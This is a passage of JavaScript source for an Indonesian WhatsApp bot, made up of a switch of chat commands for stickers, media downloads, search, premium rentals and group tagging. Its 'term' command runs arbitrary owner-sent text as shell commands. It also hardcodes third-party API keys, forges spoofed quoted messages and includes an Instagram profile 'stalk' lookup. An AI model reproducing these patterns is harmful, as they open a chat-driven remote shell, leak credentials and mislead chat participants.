		            const bufer = fs.readFileSync(tipes)
		            const desc = `${pn}`
		            const title = `${pen}`
		            const url = `${pe}`
		            const buu = `https://${be}`
		    		var anu = {
		        	detectLinks: false
		    		}
		    		var mat = await alpha.generateLinkPreview(url)
		    		mat.title = title;
		    		mat.description = desc;
		    		mat.jpegThumbnail = bufer;
		   			mat.canonicalUrl = buu; 
		    		alpha.sendMessage(from, mat, MessageType.extendedText, anu)
		            break
		    case 'public':
		              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === false) return
		          	banChats = false
		          	//fakeitem(`「 *PUBLIC-MODE* 」`)
						sendButMessage(from, `「 *PUBLIC-MODE* 」`, `Click self to return to self mode`, [
            {
              buttonId: 'self',
              buttonText: {
                displayText: `Self Mode`,
              },
              type: 1,
            }]);
        break;
			case 'self':
			          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === true) return
		          	banChats = true
		          	//fakeitem(`「 *SELF-MODE* 」`)
		          	sendButMessage(from, `「 *SELF-MODE* 」`, `Click public to return to public mode`, [
            {
              buttonId: 'public',
              buttonText: {
                displayText: `Public Mode`,
              },
              type: 1,
            }]);
        break;
		case 'revoke':
if (!isGroup) return fakegroup(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
await alpha.revokeInvite(from)
reply(lang.success())
break
		 	case 'hidetag':
		     case '_`':
		if (!mek.key.fromMe && !isGroupAdmins && !isOwner && !isCreator) return reply(lang.onlyOwner())
		     if (!isGroup) return fakegroup(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} }  } })
					break
				case 'sewacheck':
				case 'ceksewa':
							if (!isGroup) return fakegroup(lang.onlygc())
							if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
							let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
							let premiumnya = `*「 SEWA EXPIRED 」*\n\n📛 *ID*: ${from}\n⏰ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
							reply(premiumnya)
							break
				case 'sewa':
							if (!isGroup)return fakegroup(lang.onlygc())
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
							if (args[0] === 'add'){
								_sewa.addSewaGroup(from, args[1], sewa)
								reply(lang.success())
								} else if (args[0] === 'del'){
									sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
									fs.writeFileSync('./src/sewa.json', JSON.stringify(sewa))
									reply(lang.success())
									} else {
										reply(`Example : *${prefix}sewa* add/del waktu`)
										}
							break
				case 'sewalist': 
				case 'listsewa':
							let txtnyee = `*「 LIST SEWA」*\nJumlah : ${sewa.length}\n\n`
							for (let i of sewa){
								let cekvipp = ms(i.expired - Date.now())
								txtnyee += `🆔 *ID :* ${i.id} \n⏰ *Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
								}
							reply(txtnyee)
							break
				case 'premium': 
							if (args.length === 0) return reply(`Kirim perintah *${prefix}premium* add/del 62xxx waktu (misal 1 hari -> 1d)\nExample:\n${prefix}premium add 62887435047326 1d`)
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args[0] === 'add') {
								if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									premium.addPremiumUser(mentioned[0], args[2], _premium)
									reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${mentioned[0]}\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
									} else {
										premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
										reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${args[1]}@s.whatsapp.net\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
										}
										} else if (args[0] === 'del') {
											if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
									fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
									reply(lang.success())
									} else {
										_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
										fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
										reply(lang.success())
										}
										} else {
											reply('emror')
											}
							break
				case 'premiumcheck': case 'cekpremium': 
							if (!isPremium) return reply(`Akun kamu belum premium silahkan ${prefix}buypremium`)
							const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
							reply(`*「 PREMIUM EXPIRED 」*\n\n🆔 *ID*: ${sender}\n🏦 *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
							break
				case 'listprem': case 'listpremium':
							let txt = `「 *PREMIUM USER LIST* 」\n\n`
							let men = [];
							for (let i of _premium){
								men.push(i.id)
								const checkExp = ms(i.expired - Date.now())
								txt += `🆔 *ID :* @${i.id.split("@")[0]}\n⏰ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
								}
								mentions(txt, men, true)
							break
				case 'belipremium': case 'buypremium': case 'sewabot':
							sendButLocation(from, pc_sewa(_minggu, __minggu, ___minggu, _bulan, _permanen, __permanen) , `Jangan klik doang harus sewa beneran 😎 ${enter}${enter}™© | By ${ownername}`,pp_bot,  [{"buttonId": `Sewa 1 Minggu`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							break
			case 'play2':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                        const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                       await sendMediaURL(from, thumb, captions)
		                        sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   break  
		        
		               case 'sticker':
					case 'stiker': case 's':
					
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await alpha.downloadAndSaveMediaMessage(encmedia)
							ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .input(media)
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                 })
                            .on('end', async function () {
                                console.log('Finish')
                                await alpha.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: fgclink })
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(ran)
                                })
                            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(ran)
                    } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                        const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                        ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .inputFormat(media.split('.')[1])
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                                reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
                            })
                            .on('end', async function () {
                                console.log('Finish')
                                await alpha.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: fgclink })
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(ran)
                                })
                            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(ran)
                    } else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                        ranw = getRandom('.webp')
                        ranp = getRandom('.png')
                        reply(mess.wait)
                        keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
                        await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
                            fs.unlinkSync(media)
                            let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
                            fs.writeFileSync(ranp, bufferir9vn5, (err) => {
                                if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
                            })
                            exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
                                fs.unlinkSync(ranp)
                                if (err) return reply('emror bang')
                                alpha.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: mek })
                                    fs.unlinkSync(ranw)
                                })
                            })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim\nDurasi sticker video 1-9 detik...`)
                    }
                    break
		    case 'toimg':
		if (!isQuotedSticker) return reply('Reply stc nya!')
					reply(lang.wait())
					encmediaa = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaa = await alpha.downloadAndSaveMediaMessage(encmediaa)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${mediaa} ${ran}`, (err) => {
					fs.unlinkSync(mediaa)
					if (err) return reply('Yah gagal, coba ulangi ^_^')
					buffer = fs.readFileSync(ran)
					fakethumb(buffer,'```Nih kak, jgn lupa Support YT : ZEEONE OFC```')
					fs.unlinkSync(ran)
					})
					break
			case 'ytsearch': case 'yts':
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join(' ');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await alpha.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '🐣 Title: ' + video.title + '\n'
		            ytresult += '🐤 Link: ' + video.url + '\n'
		            ytresult += '🦊 Durasi: ' + video.timestamp + '\n'
					ytresult += '🐺 Views: ' + video.views + '\n'
		            ytresult += '🦡 Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '*WHATSAPP-BOT*'
		    		await fakethumb(tbuff,ytresult)
					break
			case 'setreply':
			case 'setfake':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!q) return fakegroup(mess.wrongFormat)
					fake = q
					fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
					break
			case 'setprefix':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`*Format Error!*\n\n*Example :*\n •${prefix + command} multi\n •${prefix + command} nopref\n •${prefix + command} #`)
if((args[0]) == 'multi'){
if(multi)return reply('_Sudah diaktifkan sebelumnya!_')
multi = true
nopref = false
single = false
reply(`_Succses mengganti Prefix ke Multiprefix!_`)
}else
if ((args[0]) == 'nopref'){
if(nopref)return reply('_Sudah diaktifkan sebelumnya!_')
multi = false
single = false
nopref = true
reply(`_Succses mengganti Prefix ke noprefix!_`)
}else
if((args[0]) == `${q}`){
multi = false
nopref = false
single = true
prefa = `${q}`
reply(`_Succses mengganti Prefix ke ${q}_`)
}
break
			case 'set_stc_menu':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_menu = q
					fakeitem(`Succes Mengganti stc cmd *MENU* : ${q}`)
					break
			case 'set_stc_ping':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_ping = q
					fakeitem(`Succes Mengganti stc cmd *PING* : ${q}`)
					break
			case 'set_stc_music':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_play_music = q
					fakeitem(`Succes Mengganti stc cmd *PlAY MUSIC* : ${q}`)
					break
			case 'set_stc_gclose':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_close = q
					fakeitem(`Succes Mengganti stc cmd *GROUP CLOSE* : ${q}`)
					break
			case 'set_stc_gopen':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_open = q
					fakeitem(`Succes Mengganti stc cmd *GROUP OPEN* : ${q}`)
					break
			case 'set_stc_itos':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_image_to_sticker = q
					fakeitem(`Succes Mengganti stc cmd *IMAGE TO. STICKER* : ${q}`)
					break
			case 'set_stc_to_image':
			case 'set_stc_toimg':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_to_image = q
					fakeitem(`Succes Mengganti stc cmd *STICKER TO IMAGE* : ${q}`)
					break
			case 'set_stc_self':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_self = q
					fakeitem(`Succes Mengganti stc cmd *SELF* : ${q}`)
					break
			case 'set_stc_public':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_public = q
					fakeitem(`Succes Mengganti stc cmd *PUBLIC* : ${q}`)
					break
			case 'setfakeimg':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		            boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakeitem(`Kirim gambar dengan caption ${prefix}setfakeimg`)
		          	}
					break	
			case 'setthumb':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakegroup(`Kirim gambar dengan caption ${prefix}sethumb`)
		          	}
					break	
			case 'image':
		            if (args.length < 1) return fakegroup('Masukan teks!')
		            const gimg = args.join('');
		            res = await gis(gimg, google)
		            function google(error, result){
              if (error){ return reply('Not found')}
              else {
					n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            alpha.sendMessage(from,images,image,{quoted:mek})
		            }}
		            break
		    
		    case 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					alpha.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
		
      case 'pinterest2':
		            if (args.length < 1) return fakegroup('Masukan query!')
		            const gimgg = args.join(' ');
		            reply(lang.wait())
		            gis(gimgg, async (error, result) => {
		            n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            alpha.sendMessage(from,{url:images},image,{quoted:mek})
		            });
		            break
	case 'pinterest':
            if(!q) return reply('Masukkan query')
            pinya = q
            anu = await getBuffer(`https://ferdiz-afk.my.id//api/pinterest?q=${pinya}`)
            alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0), caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/P6u0xroWJmI`, quoted: mek})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
		    case 'igstalk':
		       if (!q) return fakegroup('Usernamenya?')
		            const tod = await fetchJson(`https://ferdiz-afk.my.id/api/stalkig?username=${q}`);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*

\nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
alpha.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
break    
		    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(lang.erorLink())
            reply(lang.wait())
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*LINK VIDEO* : ${G.Normal_video}`)
            })
            break    
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            alpha.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
			case 'term':
			
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!q) return fakegroup(mess.wrongFormat)
					exec(q, (err, stdout) => {
					if (err) return fakegroup(`ALPHABOT:~ ${err}`)
					if (stdout) {
					fakegroup(stdout)
					}
					})
				    break 
		    case 'join':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            hen = args[0]
		            if (!q) return fakestatus('Masukan link group')
		            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
		            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
		            var response = await alpha.acceptInvite(codeInvite)
		            fakestatus('```SUKSES JOIN GRUP```')
		            } catch {
		            fakegroup('```LINK ERROR!```')
		            }
		            break
		    case 'twmp4': case 'twitter':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP4*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'twmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
alpha.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'alphagan.mp3', quoted:mek, ptt:true})
})
break
		    case 'runtime':
		    case 'test':
		            run = process.uptime() 
		            teks = `${kyun(run)}`
		            fakegroup(teks)
		            break  
			case 'speed':
			case 'ping':
			const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
					const child = stdout.toString('utf-8')
					const teks = child.replace(/Memory:/, "Ram:")
					const pingnya = `\`\`\`${teks}Speed: ${latensi.toFixed(4)} Second\`\`\``
					fakegroup(pingnya)
					})
					break
               
		    case 'totag':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'audio/mp4',
		                ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakegroup(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case 'tomp4':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            let owogi = await alpha.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owogi).then(res=>{
		            sendMediaURL(from,res.result,'Done')
		            })
		            }else {
		            fakegroup('reply stiker')
		            }
		            fs.unlinkSync(owgi)
		            break
		    case 'tourl':
		case 'imgtourl':{
                if ((isMedia && !mek.message.videoMessage || isQuotedImage ) && args.length == 0) {
                    var imgbb = require('imgbb-uploader')
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading image...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					reply(teks)
                    .catch((e)=>{reply(`\`\`\`[ x ]\`\`\`Eror! ada masalah dgn imgbb`)})
                } else {
                    reply(`Kirim gambar atau reply gambar dengan caption ${command}`)
                }
            }
		            
		           break
/*
]=====> NSFW MENU<=====[
*/

			case 'awoo':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
